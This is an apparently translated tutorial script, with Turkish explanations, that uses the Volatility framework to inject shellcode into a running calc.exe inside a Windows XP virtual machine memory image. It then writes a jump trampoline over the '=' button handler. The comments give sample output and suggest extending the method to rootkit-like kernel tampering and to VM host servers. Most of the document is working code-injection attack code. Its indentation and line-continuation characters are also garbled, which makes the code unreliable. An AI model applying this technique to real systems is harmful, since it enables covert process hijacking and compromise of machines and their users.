import sys
import struct

equals_button = 0x01005D51

memory_file = "WinXPSP2.vmem"
slack_space = None
trampoline_offset = None

# read in our shellcode
sc_fd = open("cmeasure.bin","rb")
sc = sc_fd.read()
sc_fd.close()

sys.path.append("/Users/justin/Downloads/volatility-2.3.1")

import volatility.conf as conf
import volatility.registry as registry

registry.PluginImporter()
config = conf.ConfObject()

import volatility.commands as commands
import volatility.addrspace as addrspace

registry.register_global_options(config, commands.Command)
registry.register_global_options(config, addrspace.BaseAddressSpace)

config.parse_options()
config.PROFILE = "WinXPSP2x86"
config.LOCATION = "file://%s" % memory_file

'''
Bu kurulum kodu, sanal makineye enjekte edeceğimiz shellcode (1) içinde okuduğumuz dışında, yazdığınız önceki kodla aynıdır.
Şimdi enjeksiyonu gerçekten gerçekleştirmek için kodun geri kalanını yerine koyalım.
'''
import volatility.plugins.taskmods as taskmods
 p = taskmods.PSList(config)
 for process in p.calculate():
if str(process.ImageFileName) == "calc.exe":
print "[*] Found calc.exe with PID %d" % process.UniqueProcessId
print "[*] Hunting for physical offsets...please wait."
address_space = process.get_process_address_space()
 pages = address_space.get_available_pages()

'''
Önce yeni bir PSList sınıfı (1) başlatıyoruz ve mevcut yapılandırmamıza geçiyoruz. PSList modülü, bellek görüntüsünde algılanan tüm çalışan işlemlerde gezinmekten sorumludur. Her süreci (2) yineleriz ve bir calc.exe işlemi bulursak, tam adres alanını (3) ve sürecin tüm bellek sayfalarını (4) elde ederiz.
Şimdi, sıfırlarla dolu kabuk kodumuzla aynı boyutta bir bellek parçası bulmak için bellek sayfalarında dolaşacağız. Ayrıca, trambolinimizi yazabilmemiz için = düğme işleyicimizin sanal adresini arıyoruz. Girintiye dikkat ederek aşağıdaki kodu girin.
'''
for page in pages:
 physical = address_space.vtop(page[0])
if physical is not None:
if slack_space is None:
 fd = open(memory_file,"r+")
fd.seek(physical)
buf = fd.read(page[1])
try:
 offset = buf.index("\x00" * len(sc))
slack_space = page[0] + offset
print "[*] Found good shellcode location!"
print "[*] Virtual address: 0x%08x" % slack_space
print "[*] Physical address: 0x%08x" % (physical¬
+ offset)
print "[*] Injecting shellcode."
 fd.seek(physical + offset)
fd.write(sc)
fd.flush()
# create our trampoline
 tramp = "\xbb%s" % struct.pack("<L", page[0] + offset)
tramp += "\xff\xe3"
if trampoline_offset is not None:
break
except:
pass
fd.close()
# check for our target code location
if page[0] <= equals_button and ¬
 equals_button < ((page[0] + page[1])-7):
print "[*] Found our trampoline target at: 0x%08x" ¬
% (physical)
# calculate virtual offset
 v_offset = equals_button - page[0]
# now calculate physical offset
trampoline_offset = physical + v_offset
print "[*] Found our trampoline target at: 0x%08x" ¬
% (trampoline_offset)
if slack_space is not None:
break
print "[*] Writing trampoline..."
 fd = open(memory_file, "r+")
fd.seek(trampoline_offset)
fd.write(tramp)
fd.close()
print "[*] Done injecting code"

'''
Tamam! Şimdi tüm bu kodun ne yaptığını inceleyelim. Her sayfanın üzerinde yinelediğimizde, kod iki üyeli bir liste döndürür; burada sayfa [0] sayfanın adresi ve sayfa [1], sayfanın bayt cinsinden boyutudur. Hafızanın her sayfasında ilerlerken, ilk olarak sayfanın bulunduğu yerin fiziksel ofsetini (diskteki RAM görüntüsündeki ofseti hatırlayın) (1) buluruz. Daha sonra RAM görüntüsünü (2) açıyoruz, sayfanın bulunduğu konumun ofsetini arıyoruz ve ardından belleğin tüm sayfasını okuyoruz. Daha sonra kabuk kodumuzla aynı boyutta bir NULL bayt (3) yığını bulmaya çalışırız; kabuk kodunu RAM görüntüsüne (4) yazdığımız yer burasıdır. Uygun bir nokta bulduktan ve kabuk kodunu ekledikten sonra, kabuk kodumuzun adresini alır ve küçük bir x86 işlem kodu yığını oluştururuz (5). Bu işlem kodları aşağıdaki derlemeyi verir:
mov ebx, ADDRESS_OF_SHELLCODE
jmp ebx
Atlamanız için tam olarak ihtiyaç duyduğunuz bayt sayısını ayırdığınızdan ve kabuk kodunuzda bu baytları geri yüklediğinizden emin olmak için Volatility’nin sökme özelliklerini kullanabileceğinizi unutmayın. Bunu bir ev ödevi olarak bırakacağım.

'''
'''
Kodumuzun son adımı, = düğme işlevimizin üzerinde yinelediğimiz geçerli sayfada bulunup bulunmadığını test etmektir (6). Bulursak, ofseti (7) hesaplar ve sonra trambolinimizi (8) yazarız. Şimdi, yürütmeyi RAM görüntüsüne yerleştirdiğimiz kabuk koduna aktarması gereken yerinde trambolinimiz var.

İlk adım, hala çalışıyorsa Bağışıklık Hata Ayıklayıcısını kapatmak ve herhangi bir calc.exe örneğini kapatmaktır. Şimdi calc.exe'yi çalıştırın ve kod enjeksiyon betiğinizi çalıştırın. Şu şekilde çıktı görmelisiniz:
$ python code_inject.py
[*] Found calc.exe with PID 1936
[*] Hunting for physical offsets...please wait.
[*] Found good shellcode location!
[*] Virtual address: 0x00010817
[*] Physical address: 0x33155817
[*] Injecting shellcode.
[*] Found our trampoline target at: 0x3abccd51
[*] Writing trampoline...
[*] Done injecting code.

Güzel! Tüm ofsetleri bulduğunu ve kabuk kodunu enjekte ettiğini göstermelidir. Test etmek için sanal makinenize girip hızlı bir 3 + 3 yapın ve = düğmesine basın. Bir mesajın açıldığını görmelisiniz! Şimdi, bu tekniği denemek için calc.exe dışında diğer uygulamaları veya hizmetleri tersine çevirmeyi deneyebilirsiniz. Bu tekniği, rootkit davranışını taklit edebilen çekirdek nesnelerini değiştirmeyi denemek için de genişletebilirsiniz. Bu teknikler, bellek adli bilime alışmanın eğlenceli bir yolu olabilir ve ayrıca makinelere fiziksel erişiminizin olduğu veya çok sayıda sanal makineyi barındıran bir sunucuyu açtığınız durumlar için de yararlıdır.


'''

